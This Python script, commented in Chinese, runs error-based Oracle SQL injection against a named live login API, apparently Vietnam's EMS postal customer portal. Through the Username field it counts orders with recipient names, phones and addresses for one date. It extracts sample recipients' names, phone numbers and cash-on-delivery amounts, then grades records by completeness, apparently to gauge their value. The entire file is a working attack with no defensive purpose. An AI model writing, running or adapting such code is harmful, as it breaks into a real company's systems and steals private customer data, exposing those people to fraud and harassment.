#!/usr/bin/env python3
"""
查询有收件人信息的订单统计
"""

import requests
import json
import time

class ReceiverQuery:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def query_receiver_stats(self):
        """查询收件人信息统计"""
        print("=" * 80)
        print("📊 收件人信息统计（2025-10-10）")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总订单数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("有收件人姓名的订单", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL"),
            
            ("收件人姓名非空且长度>0", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND LENGTH(NGUOINHAN)>0"),
            
            ("有收件人电话的订单", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL"),
            
            ("有收件人地址的订单", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIACHI IS NOT NULL"),
            
            ("收件人信息完整（姓名+电话）", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NOT NULL"),
            
            ("收件人信息全部完整（姓名+电话+地址）", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NOT NULL AND DIACHI IS NOT NULL"),
            
            ("有发件人姓名的订单", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOIGUI IS NOT NULL"),
            
            ("有发件人电话的订单", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAIGUI IS NOT NULL"),
        ]
        
        results = {}
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 数量: {result}")
                results[name] = int(result) if result.isdigit() else result
            else:
                print(f"   ❌ 查询失败")
                results[name] = 0
            time.sleep(1.5)
        
        return results
    
    def query_receiver_samples(self):
        """查询收件人样本数据"""
        print("\n" + "=" * 80)
        print("📋 收件人样本数据")
        print("=" * 80)
        
        date = '20251010'
        
        # 查询前5条有完整信息的记录
        print("\n🔎 有完整收件人信息的样本（姓名+电话）:")
        for i in range(1, 6):
            print(f"\n样本 {i}:")
            
            # MABC
            query_mabc = f"SELECT MABC FROM (SELECT MABC, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NOT NULL) WHERE RN={i}"
            mabc = self.extract_via_error(query_mabc)
            if mabc:
                print(f"  MABC: {mabc}")
                
                # 收件人姓名
                query_name = f"SELECT NGUOINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                name = self.extract_via_error(query_name)
                if name:
                    print(f"  收件人: {name}")
                
                # 收件人电话
                query_phone = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                phone = self.extract_via_error(query_phone)
                if phone:
                    print(f"  收件电话: {phone}")
                
                # 代收金额
                query_amount = f"SELECT SO_TIEN_THU_HO FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                amount = self.extract_via_error(query_amount)
                if amount:
                    print(f"  代收金额: {amount}")
                
                time.sleep(2)
    
    def query_data_quality(self):
        """分析数据质量"""
        print("\n" + "=" * 80)
        print("📈 数据完整度分级")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("A级（姓名+电话+地址+代收）", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NOT NULL AND DIACHI IS NOT NULL AND SO_TIEN_THU_HO>0"),
            
            ("B级（姓名+电话+代收）", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NOT NULL AND SO_TIEN_THU_HO>0"),
            
            ("C级（姓名+电话）", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NOT NULL"),
            
            ("D级（仅姓名）", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NULL"),
            
            ("E级（无收件人信息）", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NULL"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ 数量: {result}")
            else:
                print(f"   ❌ 查询失败")
            time.sleep(1.5)
    
    def run_all_queries(self):
        """运行所有查询"""
        print("=" * 80)
        print("👤 收件人信息统计工具")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行查询
        results = self.query_receiver_stats()
        
        # 计算百分比
        total = results.get("总订单数", 0)
        if total > 0:
            print("\n" + "=" * 80)
            print("📊 数据完整度百分比")
            print("=" * 80)
            
            for key, value in results.items():
                if key != "总订单数" and isinstance(value, int):
                    percentage = (value / total) * 100
                    print(f"  • {key}: {value:,} ({percentage:.1f}%)")
        
        # 查询样本
        self.query_receiver_samples()
        
        # 数据质量分析
        self.query_data_quality()
        
        print("\n" + "=" * 80)
        print("🎉 查询完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    query = ReceiverQuery(target_url)
    query.run_all_queries()
